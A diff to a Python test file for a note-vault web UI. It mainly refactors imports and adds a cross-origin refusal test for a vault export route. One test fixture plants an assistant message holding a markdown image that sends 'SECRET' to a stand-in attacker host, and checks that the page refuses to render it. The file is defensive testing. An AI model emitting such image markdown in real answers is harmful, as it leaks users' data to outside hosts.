@@ -27,16 +27,17 @@ from fastapi.testclient import TestClient  # noqa: E402
 def client(tmp_vault, tmp_path, monkeypatch):
     """Fresh module-level session per test, backed by a tmp fs vault."""
     from silica.ui.web import server
+    from silica.ui.web.session import SESSION
 
-    server._reset_session()
+    SESSION.reset()
     return TestClient(server.app), server
 
 
 def _render(body: str) -> str:
     """A note body as the drawer would hand it to innerHTML."""
-    from silica.ui.web.server import _linkify
+    from silica.ui.web.render import linkify
 
-    return _linkify(body, None)
+    return linkify(body, None)
 
 
 def _live_markup(rendered: str) -> list[tuple[str, dict[str, str]]]:
@@ -357,6 +358,16 @@ def test_every_state_changing_route_refuses_a_foreign_origin():
     assert not open_doors, f"state-changing routes a foreign origin reached: {open_doors}"
 
 
+def test_the_whole_vault_is_a_read_only_this_page_may_ask_for(client):
+    """The rule goes by method and this route is a GET (ADR-0142), so it names
+    the guard itself; 404 here means the guard let it through to the hosted check."""
+    tc, _server = client
+    foreign = tc.get("/vault/export", headers={"Sec-Fetch-Site": "cross-site"})
+    assert foreign.status_code == 403
+    assert foreign.json() == {"detail": "cross-origin request refused"}
+    assert tc.get("/vault/export", headers={"Sec-Fetch-Site": "same-origin"}).status_code == 404
+
+
 # --- graph document title -----------------------------------------------------
 
 
@@ -386,21 +397,22 @@ def test_render_html_escapes_the_discourse_badge_too():
 def test_the_upload_caps_are_the_documented_ones():
     """Pinned as values: the caps are what stops a drag-drop from filling the
     disk, and loosening one silently is the failure mode."""
-    from silica.ui.web import server
+    from silica.ui.web import drop
 
-    assert server._UPLOAD_MAX_BYTES == 256 * 1024 * 1024
-    assert server._UPLOAD_MAX_FILES == 32
-    assert server._MAIL_UPLOAD_MAX_BYTES == 8 * 1024 ** 3   # a RAM ceiling, measured (server.py)
+    assert drop.UPLOAD_MAX_BYTES == 256 * 1024 * 1024
+    assert drop.UPLOAD_MAX_FILES == 32
+    assert drop.MAIL_UPLOAD_MAX_BYTES == 8 * 1024 ** 3   # a RAM ceiling, measured (drop.py)
 
 
 def _no_llm(monkeypatch, server):
     """Stub the turn so a cap that stopped holding fails the assertion below
     instead of hanging the suite on a real agent run."""
+    from silica.ui.web import turn
     def fake_run_agent(messages, model, tool_progress_callback=None, cancel_token=None, **kw):
         messages.append({"role": "assistant", "content": "ok"})
         return "ok"
 
-    monkeypatch.setattr(server, "run_agent", fake_run_agent)
+    monkeypatch.setattr(turn, "run_agent", fake_run_agent)
 
 
 def test_an_oversized_upload_is_refused_and_leaves_no_partial_file(client, monkeypatch):
@@ -408,11 +420,13 @@ def test_an_oversized_upload_is_refused_and_leaves_no_partial_file(client, monke
     part already written must not stay behind in the vault."""
     from silica.config import CONFIG
     from silica.ui.web import server
+    from silica.ui.web import drop
+    from silica.ui.web.session import SESSION
 
     tc, _server = client
     _no_llm(monkeypatch, server)
-    monkeypatch.setattr(server, "_UPLOAD_MAX_BYTES", 256)
-    monkeypatch.setattr(server, "_UPLOAD_CHUNK", 64)  # several chunks land first
+    monkeypatch.setattr(drop, "UPLOAD_MAX_BYTES", 256)
+    monkeypatch.setattr(drop, "UPLOAD_CHUNK", 64)  # several chunks land first
 
     resp = tc.post(
         "/nucleate",
@@ -422,24 +436,26 @@ def test_an_oversized_upload_is_refused_and_leaves_no_partial_file(client, monke
     assert resp.status_code == 413
     inbox = Path(CONFIG.vault_path) / "Inbox"
     assert not inbox.exists() or list(inbox.iterdir()) == []
-    assert server._busy is False  # the refused drop released the turn slot
+    assert SESSION.busy is False  # the refused drop released the turn slot
 
 
 def test_too_many_files_in_one_drop_are_refused_before_anything_is_written(client, monkeypatch):
     from silica.config import CONFIG
     from silica.ui.web import server
+    from silica.ui.web import drop
+    from silica.ui.web.session import SESSION
 
     tc, _server = client
     _no_llm(monkeypatch, server)
     files = [
         ("files", (f"n{i}.md", b"body", "text/markdown"))
-        for i in range(server._UPLOAD_MAX_FILES + 1)
+        for i in range(drop.UPLOAD_MAX_FILES + 1)
     ]
     resp = tc.post("/nucleate", files=files, data={"text": ""})
     assert resp.status_code == 413
     inbox = Path(CONFIG.vault_path) / "Inbox"
     assert not inbox.exists() or list(inbox.iterdir()) == []
-    assert server._busy is False
+    assert SESSION.busy is False
 
 
 # --- ADR-0098 H6: an answer draws no image from another origin ---------------
@@ -463,18 +479,18 @@ _FOREIGN_IMAGES = [
 
 @pytest.mark.parametrize("answer", _FOREIGN_IMAGES)
 def test_an_answer_draws_no_image_from_another_origin(answer):
-    from silica.ui.web.server import _linkify
+    from silica.ui.web.render import linkify
 
-    html = _linkify(answer, None, remote_images=False)
+    html = linkify(answer, None, remote_images=False)
     leaving = [a["src"] for tag, a in _live_markup(html)
                if tag == "img" and not a["src"].startswith(("/asset?", "data:image/"))]
     assert leaving == []
 
 
 def test_an_answer_keeps_the_vaults_own_images():
-    from silica.ui.web.server import _linkify
+    from silica.ui.web.render import linkify
 
-    html = _linkify("![a](assets/a.png) ![d](data:image/png;base64,iVBORw0KGgo=)",
+    html = linkify("![a](assets/a.png) ![d](data:image/png;base64,iVBORw0KGgo=)",
                     None, remote_images=False)
     srcs = [a["src"] for tag, a in _live_markup(html) if tag == "img"]
     assert len(srcs) == 2
@@ -486,8 +502,9 @@ def test_a_note_keeps_its_web_images():
 
 
 def test_a_reloaded_chat_draws_no_image_from_another_origin(client):
+    from silica.ui.web.session import SESSION
     tc, server = client
-    server.messages.append({"role": "assistant", "content": "![x](//attacker.example/p.png?d=SECRET)"})
+    SESSION.chat.messages.append({"role": "assistant", "content": "![x](//attacker.example/p.png?d=SECRET)"})
 
     html = tc.get("/messages").json()[-1]["html"]
     assert "<img" not in html and "image from attacker.example" in html
